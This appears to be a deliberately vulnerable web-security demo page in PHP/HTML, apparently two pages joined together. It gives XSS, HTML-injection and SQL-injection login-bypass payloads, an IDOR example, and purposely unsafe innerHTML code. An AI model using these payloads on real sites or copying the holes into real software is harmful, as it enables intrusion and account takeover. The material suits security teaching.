<?php

?>
<!DOCTYPE html>
<html>
<head>
    <title>Vulnerability Demo</title>
</head>
<body>
    <h1>Security Vulnerabilities Found</h1>
    
    <h2>1. Stored XSS</h2>
    <p>Go to <a href="welcome.php">welcome.php</a> and post:</p>
    <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code>
    
    <h2>2. Reflected XSS</h2>
    <p>Visit:</p>
    <code><a href="index.php?email=%22%3E%3Cscript%3Ealert(%27XSS%27)%3C/script%3E">index.php?email=">&lt;script&gt;alert('XSS')&lt;/script&gt;</a></code>
    
    <h2>3. SQL Injection</h2>
    <p>Login with:</p>
    <code>Email: admin' -- -<br>Password: anything</code>
    
    <h2>4. HTML Injection</h2>
    <p>Post in comments:</p>
    <code>&lt;h1 style="color:red"&gt;HACKED&lt;/h1&gt;</code>

    <h2>6. DOM-Based XSS</h2>
<p>This page takes a fragment and writes it directly to the DOM</p>
<input type="text" id="userInput" placeholder="Enter your name">
<button onclick="showName()">Submit</button>
<div id="output"></div>

<script>
function showName() {
    
    var name = document.getElementById('userInput').value;
    document.getElementById('output').innerHTML = name;
}
</script>
<p><strong>Try:</strong> <code>&lt;img src=x onerror=alert('DOM XSS')&gt;</code></p>

<h2>9. Insecure Direct Object Reference</h2>
<p>View your invoice (ID=1):</p>
<a href="invoice.php?id=1">My Invoice</a>

<p><strong>Try accessing someone else's:</strong></p>
<code><a href="invoice.php?id=3">invoice.php?id=3</a> (No authorization check!)</code>

<!DOCTYPE html>
<html>
<head>
    <title>DOM XSS Live Demo</title>
    <style>
        body { font-family: Arial; padding: 20px; }
        .demo-box { border: 2px solid #333; padding: 20px; margin: 20px 0; }
        input { padding: 8px; width: 300px; }
        button { padding: 8px 15px; background: #4CAF50; color: white; border: none; cursor: pointer; }
        .output { margin-top: 15px; padding: 10px; background: #f0f0f0; min-height: 50px; }
        .payload { background: #333; color: white; padding: 10px; font-family: monospace; }
    </style>
</head>
<body>
    <h1>🔴 DOM-Based XSS Live Demo</h1>
    
    <div class="demo-box">
        <h2>Step 1: Normal Usage</h2>
        <p>Type your name and click Submit:</p>
        <input type="text" id="userInput" placeholder="Enter your name" value="John Doe">
        <button onclick="showName()">Submit</button>
        
        <div class="output" id="output">
            Results will appear here
        </div>
    </div>

    <script>
    function showName() {
        
        var name = document.getElementById('userInput').value;
        document.getElementById('output').innerHTML = name;
    }
    </script>

    <div class="demo-box" style="border-color: red;">
        <h2>Step 2: The Attack!</h2>
        <p><strong>Copy and paste this payload into the input box above:</strong></p>
        <div class="payload">
            &lt;img src=x onerror=alert('XSS_FOUND!')&gt;
        </div>
        <p><em>Then click Submit again</em></p>
    </div>

    <div class="demo-box">
        <h2>More Impressive Payloads to Try:</h2>
        
        <p><strong>1. Deface the page (changes background):</strong></p>
        <div class="payload">
            &lt;img src=x onerror="document.body.style.background='red'"&gt;
        </div>
        
        <p><strong>2. Steal cookies (demo):</strong></p>
        <div class="payload">
            &lt;img src=x onerror="alert('Cookies: ' + document.cookie)"&gt;
        </div>
        
        <p><strong>3. Redirect to another page:</strong></p>
        <div class="payload">
            &lt;img src=x onerror="window.location='https://example.com'"&gt;
        </div>
        
        <p><strong>4. Multiple attacks at once:</strong></p>
        <div class="payload">
            &lt;img src=x onerror="alert('Hacked!');document.body.innerHTML='&lt;h1&gt;Site Defaced!&lt;/h1&gt;'"&gt;
        </div>
    </div>
</body>
</html>
</body>
</html>